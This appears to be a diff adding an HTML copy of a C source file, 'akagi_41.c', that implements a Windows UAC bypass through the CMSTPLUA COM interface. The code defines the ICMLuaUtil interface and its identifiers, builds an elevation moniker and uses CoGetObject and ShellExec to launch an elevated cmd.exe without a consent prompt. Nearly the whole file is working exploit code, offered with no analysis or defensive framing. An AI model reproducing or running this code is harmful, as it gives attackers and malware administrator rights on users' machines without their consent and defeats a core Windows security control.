@@ -1,0 +1,143 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>akagi_41.c</title>
+</head><body>#UAC bypass using CMSTPLUA COM interface<br/>
+typedef interface ICMLuaUtil ICMLuaUtil;<br/>
+<br/>
+typedef struct ICMLuaUtilVtbl {<br/>
+<br/>
+  BEGIN_INTERFACE<br/>
+<br/>
+    HRESULT(STDMETHODCALLTYPE *QueryInterface)(<br/>
+      __RPC__in ICMLuaUtil * This,<br/>
+      __RPC__in REFIID riid,<br/>
+      _COM_Outptr_ void **ppvObject);<br/>
+<br/>
+  ULONG(STDMETHODCALLTYPE *AddRef)(<br/>
+    __RPC__in ICMLuaUtil * This);<br/>
+<br/>
+  ULONG(STDMETHODCALLTYPE *Release)(<br/>
+    __RPC__in ICMLuaUtil * This);<br/>
+<br/>
+  HRESULT(STDMETHODCALLTYPE *Method1)(<br/>
+    __RPC__in ICMLuaUtil * This);<br/>
+<br/>
+  HRESULT(STDMETHODCALLTYPE *Method2)(<br/>
+    __RPC__in ICMLuaUtil * This);<br/>
+<br/>
+  HRESULT(STDMETHODCALLTYPE *Method3)(<br/>
+    __RPC__in ICMLuaUtil * This);<br/>
+<br/>
+  HRESULT(STDMETHODCALLTYPE *Method4)(<br/>
+    __RPC__in ICMLuaUtil * This);<br/>
+<br/>
+  HRESULT(STDMETHODCALLTYPE *Method5)(<br/>
+    __RPC__in ICMLuaUtil * This);<br/>
+<br/>
+  HRESULT(STDMETHODCALLTYPE *Method6)(<br/>
+    __RPC__in ICMLuaUtil * This);<br/>
+<br/>
+  HRESULT(STDMETHODCALLTYPE *ShellExec)(<br/>
+    __RPC__in ICMLuaUtil * This, <br/>
+    _In_   LPCTSTR lpFile,<br/>
+    _In_opt_ LPCTSTR lpParameters,<br/>
+    _In_opt_ LPCTSTR lpDirectory,<br/>
+    _In_   ULONG fMask,<br/>
+    _In_   ULONG nShow<br/>
+    );<br/>
+<br/>
+  HRESULT(STDMETHODCALLTYPE *Method8)(<br/>
+    __RPC__in ICMLuaUtil * This);<br/>
+<br/>
+  HRESULT(STDMETHODCALLTYPE *Method9)(<br/>
+    __RPC__in ICMLuaUtil * This);<br/>
+<br/>
+  HRESULT(STDMETHODCALLTYPE *Method10)(<br/>
+    __RPC__in ICMLuaUtil * This);<br/>
+<br/>
+  HRESULT(STDMETHODCALLTYPE *Method11)(<br/>
+    __RPC__in ICMLuaUtil * This);<br/>
+<br/>
+  HRESULT(STDMETHODCALLTYPE *Method12)(<br/>
+    __RPC__in ICMLuaUtil * This);<br/>
+<br/>
+  HRESULT(STDMETHODCALLTYPE *Method13)(<br/>
+    __RPC__in ICMLuaUtil * This);<br/>
+<br/>
+  HRESULT(STDMETHODCALLTYPE *Method14)(<br/>
+    __RPC__in ICMLuaUtil * This);<br/>
+<br/>
+  HRESULT(STDMETHODCALLTYPE *Method15)(<br/>
+    __RPC__in ICMLuaUtil * This);<br/>
+<br/>
+  HRESULT(STDMETHODCALLTYPE *Method16)(<br/>
+    __RPC__in ICMLuaUtil * This);<br/>
+<br/>
+  HRESULT(STDMETHODCALLTYPE *Method17)(<br/>
+    __RPC__in ICMLuaUtil * This);<br/>
+<br/>
+  HRESULT(STDMETHODCALLTYPE *Method18)(<br/>
+    __RPC__in ICMLuaUtil * This);<br/>
+<br/>
+  HRESULT(STDMETHODCALLTYPE *Method19)(<br/>
+    __RPC__in ICMLuaUtil * This);<br/>
+<br/>
+  HRESULT(STDMETHODCALLTYPE *Method20)(<br/>
+    __RPC__in ICMLuaUtil * This);<br/>
+<br/>
+  END_INTERFACE<br/>
+<br/>
+} *PICMLuaUtilVtbl;<br/>
+<br/>
+interface ICMLuaUtil<br/>
+{<br/>
+  CONST_VTBL struct ICMLuaUtilVtbl *lpVtbl;<br/>
+};<br/>
+<br/>
+#define T_CLSID_CMSTPLUA L&quot;{3E5FC7F9-9A51-4367-9063-A120244FBEC7}&quot;<br/>
+#define T_IID_ICMLuaUtil L&quot;{6EDD6D74-C007-4E75-B76A-E5740995E24C}&quot;<br/>
+<br/>
+VOID Method41_Test()<br/>
+{<br/>
+  HRESULT     r = E_FAIL;<br/>
+  BOOL       bCond = FALSE;<br/>
+  IID       xIID_ICMLuaUtil;<br/>
+  CLSID      xCLSID_ICMLuaUtil;<br/>
+  ICMLuaUtil   *CMLuaUtil = NULL;<br/>
+<br/>
+  BIND_OPTS3    bop;<br/>
+  WCHAR      szElevationMoniker[MAX_PATH];<br/>
+<br/>
+  do {<br/>
+<br/>
+    if (CLSIDFromString(T_CLSID_CMSTPLUA, &amp;xCLSID_ICMLuaUtil) != NOERROR) {<br/>
+      break;<br/>
+    }<br/>
+    if (IIDFromString(T_IID_ICMLuaUtil, &amp;xIID_ICMLuaUtil) != S_OK) {<br/>
+      break;<br/>
+    }<br/>
+<br/>
+    RtlSecureZeroMemory(szElevationMoniker, sizeof(szElevationMoniker));<br/>
+<br/>
+    _strcpy(szElevationMoniker, L&quot;Elevation:Administrator!new:&quot;);<br/>
+    _strcat(szElevationMoniker, T_CLSID_CMSTPLUA);<br/>
+<br/>
+    RtlSecureZeroMemory(&amp;bop, sizeof(bop));<br/>
+    bop.cbStruct = sizeof(bop);<br/>
+    bop.dwClassContext = CLSCTX_LOCAL_SERVER;<br/>
+<br/>
+    r = CoGetObject(szElevationMoniker, (BIND_OPTS *)&amp;bop, &amp;xIID_ICMLuaUtil, &amp;CMLuaUtil);<br/>
+    if (r != S_OK) {<br/>
+      break;<br/>
+    }<br/>
+<br/>
+    r = CMLuaUtil-&gt;lpVtbl-&gt;ShellExec(CMLuaUtil, L&quot;C:\\windows\\system32\\cmd.exe&quot;, NULL, NULL, SEE_MASK_DEFAULT, SW_SHOW);<br/>
+<br/>
+  } while (bCond);<br/>
+<br/>
+  if (CMLuaUtil != NULL) {<br/>
+    CMLuaUtil-&gt;lpVtbl-&gt;Release(CMLuaUtil);<br/>
+  }<br/>
+<br/>
+}</body></html>
